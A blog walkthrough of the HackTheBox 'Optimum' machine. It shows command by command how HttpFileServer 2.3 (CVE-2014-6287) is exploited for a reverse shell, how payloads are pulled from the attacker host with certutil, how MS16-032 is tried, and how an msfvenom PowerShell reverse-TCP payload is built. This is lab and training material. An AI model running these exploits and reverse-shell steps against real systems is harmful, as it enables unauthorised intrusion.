@@ -1,0 +1,554 @@
+<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Optimum | Biscotti Diskette </title> <meta name="author" content="Biscotti Diskette"> <meta name="description" content="Optimum from HackTheBox."> <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="/assets/img/frontpage/Logo1.png?4f879aeff848659581251777fe0ab074"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://biscottidiskette.github.io/boxes/23_optimum/"> <script src="/assets/js/theme.js?9a0c749ec5240d9cda97bc72359a72c0"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
+    initTheme();
+  </script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> <span class="font-weight-bold">Biscotti</span> Diskette </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item active"> <a class="nav-link" href="/boxes/">boxes <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/certifications/">certs </a> </li> <li class="nav-item "> <a class="nav-link" href="/bounties/">bounties </a> </li> <li class="nav-item "> <a class="nav-link" href="/cves/">cves </a> </li> <li class="nav-item "> <a class="nav-link" href="/presentations/">talks </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repos </a> </li> <li class="nav-item "> <a class="nav-link" href="/publications/">publications </a> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="ti ti-sun-moon" id="light-toggle-system"></i> <i class="ti ti-moon-filled" id="light-toggle-dark"></i> <i class="ti ti-sun-filled" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">Optimum</h1> <p class="post-description">Optimum from HackTheBox.</p> </header> <article> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/optimum/logo.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="HTB Optimum Logo" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br></p> <h2>Link</h2> <p><a href="https://app.hackthebox.com/machines/Optimum" rel="external nofollow noopener" target="_blank">Room Link</a></p> <p><br></p> <h2>Process</h2> <p><br> A reliable source tells me that this is the optimum box to do right now. So here we go.</p> <p>Run nmap and get a list of the ports. Notice that there is HttpFileServer, version 2.3, running on port 80.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/optimum]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-A</span> <span class="nt">-O</span> <span class="nt">-oN</span> nmap 10.10.10.8  
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
+Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-02-02 16:09 AEDT
+Nmap scan report <span class="k">for </span>10.10.10.8
+Host is up <span class="o">(</span>0.016s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 999 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+PORT   STATE SERVICE VERSION
+80/tcp open  http    HttpFileServer httpd 2.3
+|_http-title: HFS /
+|_http-server-header: HFS 2.3
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device <span class="nb">type</span>: general purpose
+Running <span class="o">(</span>JUST GUESSING<span class="o">)</span>: Microsoft Windows 2012|2008|7 <span class="o">(</span>97%<span class="o">)</span>
+OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
+Aggressive OS guesses: Microsoft Windows Server 2012 R2 <span class="o">(</span>97%<span class="o">)</span>, Microsoft Windows 7 or Windows Server 2008 R2 <span class="o">(</span>91%<span class="o">)</span>, Microsoft Windows Server 2012 or Windows Server 2012 R2 <span class="o">(</span>89%<span class="o">)</span>
+No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span>
+Network Distance: 2 hops
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+TRACEROUTE <span class="o">(</span>using port 80/tcp<span class="o">)</span>
+HOP RTT      ADDRESS
+1   18.56 ms 10.10.16.1
+2   18.72 ms 10.10.10.8
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>21.23 seconds
+</code></pre></div></div> <p><br> Run nmap against all the ports to try and find any unsual services.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/optimum]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-oN</span> nmapfull 10.10.10.8    
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
+Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-02-02 16:09 AEDT
+Nmap scan report <span class="k">for </span>10.10.10.8
+Host is up <span class="o">(</span>0.022s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65534 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>115.85 seconds
+</code></pre></div></div> <p><br> Run the searchsploit for the HttpFileServer 2.3 to find any potential exploits.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/optimum]
+└─<span class="nv">$ </span>searchsploit HttpFileServer                  
+<span class="nt">----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                                                                                                                                            |  Path
+<span class="nt">----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Rejetto HttpFileServer 2.3.x - Remote Command Execution <span class="o">(</span>3<span class="o">)</span>                                                                                                                                               | windows/webapps/49125.py
+<span class="nt">----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+</code></pre></div></div> <p><br> Copy the exploit into the local working folder.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/optimum]
+└─<span class="nv">$ </span><span class="nb">cp</span> <span class="sb">`</span>locate 49125.py<span class="sb">`</span> <span class="nb">.</span>
+</code></pre></div></div> <p><br> Search the exploit-db for the same http file server.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/optimum/exploitdb.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Look up Exploit-DB" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><a href="https://www.exploit-db.com/exploits/39161" rel="external nofollow noopener" target="_blank">https://www.exploit-db.com/exploits/39161</a></p> <p><br> Download ye old exploit.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/optimum]
+└─<span class="nv">$ </span>wget https://www.exploit-db.com/raw/39161 <span class="nt">-O</span> exploit.py                                           
+<span class="nt">--2025-02-02</span> 16:19:17--  https://www.exploit-db.com/raw/39161
+Resolving www.exploit-db.com <span class="o">(</span>www.exploit-db.com<span class="o">)</span>... 192.124.249.13
+Connecting to www.exploit-db.com <span class="o">(</span>www.exploit-db.com<span class="o">)</span>|192.124.249.13|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2515 <span class="o">(</span>2.5K<span class="o">)</span> <span class="o">[</span>text/plain]
+Saving to: ‘exploit.py’
+
+exploit.py                                                 100%[<span class="o">========================================================================================================================================&gt;]</span>   2.46K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s      
+
+2025-02-02 16:19:19 <span class="o">(</span>73.8 MB/s<span class="o">)</span> - ‘exploit.py’ saved <span class="o">[</span>2515/2515]
+</code></pre></div></div> <p><br> Update the exploit ip_addr and local_port variables to the attack machine LHOST and LPORT.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
+<span class="c"># Exploit Title: HttpFileServer 2.3.x Remote Command Execution</span>
+<span class="c"># Google Dork: intext:"httpfileserver 2.3"</span>
+<span class="c"># Date: 04-01-2016</span>
+<span class="c"># Remote: Yes</span>
+<span class="c"># Exploit Author: Avinash Kumar Thapa aka "-Acid"</span>
+<span class="c"># Vendor Homepage: http://rejetto.com/</span>
+<span class="c"># Software Link: http://sourceforge.net/projects/hfs/</span>
+<span class="c"># Version: 2.3.x</span>
+<span class="c"># Tested on: Windows Server 2008 , Windows 8, Windows 7</span>
+<span class="c"># CVE : CVE-2014-6287</span>
+
+&lt;snip&gt;
+
+    ip_addr <span class="o">=</span> <span class="s2">"192.168.44.128"</span> <span class="c">#local IP address</span>
+	local_port <span class="o">=</span> <span class="s2">"443"</span> <span class="c"># Local Port number</span>
+
+&lt;snip&gt;
+</code></pre></div></div> <p><br> Transfer nc.exe into the local working folder and start a python webserver listening on port 80.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/optimum]
+└─<span class="nv">$ </span><span class="nb">cp</span> <span class="sb">`</span>locate nc.exe<span class="sb">`</span> <span class="nb">.</span>  
+                                                                                                                                                                                                                                            
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/optimum]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 80                             
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
+listening on <span class="o">[</span>any] 80 ...
+</code></pre></div></div> <p><br> Start a netcat listener.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/optimum]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443                                        
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
+listening on <span class="o">[</span>any] 443 ...
+</code></pre></div></div> <p><br> Execute the listener. I had to run it twice to get it to work.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/optimum]
+└─<span class="nv">$ </span>python2 exploit.py 10.10.10.8 80
+                                                                                                                                                                                                                                            
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/optimum]
+└─<span class="nv">$ </span>python2 exploit.py 10.10.10.8 80
+</code></pre></div></div> <p><br> Check the listener and catch that sweet, sweet shell.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/optimum]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443                                        
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.16.12] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.8] 49187
+Microsoft Windows <span class="o">[</span>Version 6.3.9600]
+<span class="o">(</span>c<span class="o">)</span> 2013 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\D</span>esktop&gt;
+</code></pre></div></div> <p><br> Get the user.txt flag.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\D</span>esktop&gt;type user.txt
+<span class="nb">type </span>user.txt
+&lt;redacted&gt;
+
+C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\D</span>esktop&gt;ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  <span class="nb">.</span> : 
+   IPv4 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 10.10.10.8
+   Subnet Mask <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 255.255.255.0
+   Default Gateway <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 10.10.10.2
+
+Tunnel adapter isatap.<span class="o">{</span>99C463C2-DC10-45A6-9CC8-E62F160519AE<span class="o">}</span>:
+
+   Media State <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : Media disconnected
+   Connection-specific DNS Suffix  <span class="nb">.</span> :
+</code></pre></div></div> <p><br> Run the whoami and the whoami /priv to see who we are and what privileges that we have.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\D</span>esktop&gt;whoami
+<span class="nb">whoami
+</span>optimum<span class="se">\k</span>ostas
+
+C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\D</span>esktop&gt;whoami /priv
+<span class="nb">whoami</span> /priv
+
+PRIVILEGES INFORMATION
+<span class="nt">----------------------</span>
+
+Privilege Name                Description                    State   
+<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">========</span>
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Disabled
+</code></pre></div></div> <p><br> Run systeminfo to get an understanding of what environment the we are in. We know the version of Windows, architecture, and hotfixes applied.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\D</span>esktop&gt;systeminfo
+systeminfo
+
+Host Name:                 OPTIMUM
+OS Name:                   Microsoft Windows Server 2012 R2 Standard
+OS Version:                6.3.9600 N/A Build 9600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                00252-70000-00000-AA535
+Original Install Date:     18/3/2017, 1:51:36 ��
+System Boot Time:          14/2/2025, 8:07:23 ��
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               x64-based PC
+Processor<span class="o">(</span>s<span class="o">)</span>:              1 Processor<span class="o">(</span>s<span class="o">)</span> Installed.
+                           <span class="o">[</span>01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2645 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
+Windows Directory:         C:<span class="se">\W</span>indows
+System Directory:          C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32
+Boot Device:               <span class="se">\D</span>evice<span class="se">\H</span>arddiskVolume1
+System Locale:             el<span class="p">;</span>Greek
+Input Locale:              en-us<span class="p">;</span>English <span class="o">(</span>United States<span class="o">)</span>
+Time Zone:                 <span class="o">(</span>UTC+02:00<span class="o">)</span> Athens, Bucharest
+Total Physical Memory:     4.095 MB
+Available Physical Memory: 3.425 MB
+Virtual Memory: Max Size:  5.503 MB
+Virtual Memory: Available: 4.888 MB
+Virtual Memory: In Use:    615 MB
+Page File Location<span class="o">(</span>s<span class="o">)</span>:     C:<span class="se">\p</span>agefile.sys
+Domain:                    HTB
+Logon Server:              <span class="se">\\</span>OPTIMUM
+Hotfix<span class="o">(</span>s<span class="o">)</span>:                 31 Hotfix<span class="o">(</span>s<span class="o">)</span> Installed.
+                           <span class="o">[</span>01]: KB2959936
+                           <span class="o">[</span>02]: KB2896496
+                           <span class="o">[</span>03]: KB2919355
+                           <span class="o">[</span>04]: KB2920189
+                           <span class="o">[</span>05]: KB2928120
+                           <span class="o">[</span>06]: KB2931358
+                           <span class="o">[</span>07]: KB2931366
+                           <span class="o">[</span>08]: KB2933826
+                           <span class="o">[</span>09]: KB2938772
+                           <span class="o">[</span>10]: KB2949621
+                           <span class="o">[</span>11]: KB2954879
+                           <span class="o">[</span>12]: KB2958262
+                           <span class="o">[</span>13]: KB2958263
+                           <span class="o">[</span>14]: KB2961072
+                           <span class="o">[</span>15]: KB2965500
+                           <span class="o">[</span>16]: KB2966407
+                           <span class="o">[</span>17]: KB2967917
+                           <span class="o">[</span>18]: KB2971203
+                           <span class="o">[</span>19]: KB2971850
+                           <span class="o">[</span>20]: KB2973351
+                           <span class="o">[</span>21]: KB2973448
+                           <span class="o">[</span>22]: KB2975061
+                           <span class="o">[</span>23]: KB2976627
+                           <span class="o">[</span>24]: KB2977629
+                           <span class="o">[</span>25]: KB2981580
+                           <span class="o">[</span>26]: KB2987107
+                           <span class="o">[</span>27]: KB2989647
+                           <span class="o">[</span>28]: KB2998527
+                           <span class="o">[</span>29]: KB3000850
+                           <span class="o">[</span>30]: KB3003057
+                           <span class="o">[</span>31]: KB3014442
+Network Card<span class="o">(</span>s<span class="o">)</span>:           1 NIC<span class="o">(</span>s<span class="o">)</span> Installed.
+                           <span class="o">[</span>01]: Intel<span class="o">(</span>R<span class="o">)</span> 82574L Gigabit Network Connection
+                                 Connection Name: Ethernet0
+                                 DHCP Enabled:    No
+                                 IP address<span class="o">(</span>es<span class="o">)</span>
+                                 <span class="o">[</span>01]: 10.10.10.8
+Hyper-V Requirements:      A hypervisor has been detected. Features required <span class="k">for </span>Hyper-V will not be displayed.
+</code></pre></div></div> <p><br> Searching for that version of Windows we stumble across MS16-032 PowerShell script.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/optimum/exploitdb032.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Look up Exploit-DB" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><a href="https://www.exploit-db.com/exploits/39719" rel="external nofollow noopener" target="_blank">https://www.exploit-db.com/exploits/39719</a></p> <p><br> Download the PowerShell script.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/optimum]
+└─<span class="nv">$ </span>wget https://www.exploit-db.com/raw/39719 <span class="nt">-O</span> MS16-032.ps1    
+<span class="nt">--2025-02-09</span> 00:28:42--  https://www.exploit-db.com/raw/39719
+Resolving www.exploit-db.com <span class="o">(</span>www.exploit-db.com<span class="o">)</span>... 192.124.249.13
+Connecting to www.exploit-db.com <span class="o">(</span>www.exploit-db.com<span class="o">)</span>|192.124.249.13|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified <span class="o">[</span>text/plain]
+Saving to: ‘MS16-032.ps1’
+
+MS16-032.ps1                                                   <span class="o">[</span>  &lt;<span class="o">=&gt;</span>                                                                                                                                    <span class="o">]</span>  11.55K  56.0KB/s    <span class="k">in </span>0.2s    
+
+2025-02-09 00:28:43 <span class="o">(</span>56.0 KB/s<span class="o">)</span> - ‘MS16-032.ps1’ saved <span class="o">[</span>11829]
+</code></pre></div></div> <p><br> Transfer the exploit to the victim machine.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\D</span>esktop&gt;certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> http://10.10.16.12/MS16-032.ps1 MS16-032.ps1
+certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> http://10.10.16.12/MS16-032.ps1 MS16-032.ps1
+<span class="k">****</span>  Online  <span class="k">****</span>
+CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
+</code></pre></div></div> <p><br> Try the exploit multiple times and it would always hand the shell. Control+c and reget the shell and repeat.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/optimum]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.16.12] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.8] 49243
+Microsoft Windows <span class="o">[</span>Version 6.3.9600]
+<span class="o">(</span>c<span class="o">)</span> 2013 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\D</span>esktop&gt;C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\W</span>indowsPowerShell<span class="se">\v</span>1.0<span class="se">\p</span>owershell.exe <span class="nt">-noexit</span> <span class="s2">"&amp; "</span>C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\D</span>esktop<span class="se">\M</span>S16-032.ps1<span class="s2">"
+C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\S</span><span class="s2">ystem32</span><span class="se">\W</span><span class="s2">indowsPowerShell</span><span class="se">\v</span><span class="s2">1.0</span><span class="se">\p</span><span class="s2">owershell.exe -noexit "</span>&amp; <span class="s2">"C:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\k</span><span class="s2">ostas</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\M</span><span class="s2">S16-032.ps1"</span>
+^C
+                                                                                                                                                                                                                                            
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/optimum]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.16.12] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.8] 49247
+Microsoft Windows <span class="o">[</span>Version 6.3.9600]
+<span class="o">(</span>c<span class="o">)</span> 2013 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\D</span>esktop&gt;powershell <span class="nt">-exec</span> bypass
+powershell <span class="nt">-exec</span> bypass
+Windows PowerShell 
+Copyright <span class="o">(</span>C<span class="o">)</span> 2014 Microsoft Corporation. All rights reserved.
+
+^C
+                                                                                                                                                                                                                                            
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/optimum]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.16.12] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.8] 49251
+Microsoft Windows <span class="o">[</span>Version 6.3.9600]
+<span class="o">(</span>c<span class="o">)</span> 2013 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\D</span>esktop&gt;c:<span class="se">\w</span>indows<span class="se">\s</span>ysnative<span class="se">\w</span>indowspowershell<span class="se">\v</span>1.0<span class="se">\p</span>owershell.exe
+c:<span class="se">\w</span>indows<span class="se">\s</span>ysnative<span class="se">\w</span>indowspowershell<span class="se">\v</span>1.0<span class="se">\p</span>owershell.exe
+Windows PowerShell
+Copyright <span class="o">(</span>C<span class="o">)</span> 2014 Microsoft Corporation. All rights reserved.
+
+PS C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\D</span>esktop&gt; Set-ExecutionPolicy <span class="nt">-ExecutionPolicy</span> unrestricted
+</code></pre></div></div> <p><br> Create an msfvenom using a powershell payload.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/optimum]
+└─<span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/x64/powershell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.16.12 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-f</span> exe <span class="nt">-o</span> psshell.exe
+<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 1887 bytes
+Final size of exe file: 8192 bytes
+Saved as: psshell.exe
+</code></pre></div></div> <p><br> Set up a brand-spanking-new listener to catch the new payload.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/optimum]
+└─<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 4444
+listening on <span class="o">[</span>any] 4444 ...
+</code></pre></div></div> <p><br> Transfer to the victim machine.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\D</span>esktop&gt;certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> http://10.10.16.12/psshell.exe psshell.exe
+certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> http://10.10.16.12/psshell.exe psshell.exe
+<span class="k">****</span>  Online  <span class="k">****</span>
+CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
+</code></pre></div></div> <p><br> Execute the executable exploit.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\D</span>esktop&gt;.<span class="se">\p</span>sshell.exe
+.<span class="se">\p</span>sshell.exe
+</code></pre></div></div> <p><br> Check the 4444 listener and catch the new shell and notice we are in PowerShell now.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/optimum]
+└─<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 4444
+listening on <span class="o">[</span>any] 4444 ...
+connect to <span class="o">[</span>10.10.16.12] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.8] 49263
+Windows PowerShell running as user kostas on OPTIMUM
+Copyright <span class="o">(</span>C<span class="o">)</span> Microsoft Corporation. All rights reserved.
+
+<span class="nb">whoami
+</span>optimum<span class="se">\k</span>ostas
+PS C:<span class="se">\U</span>sers<span class="se">\k</span>ostas<span class="se">\D</span>esktop&gt;
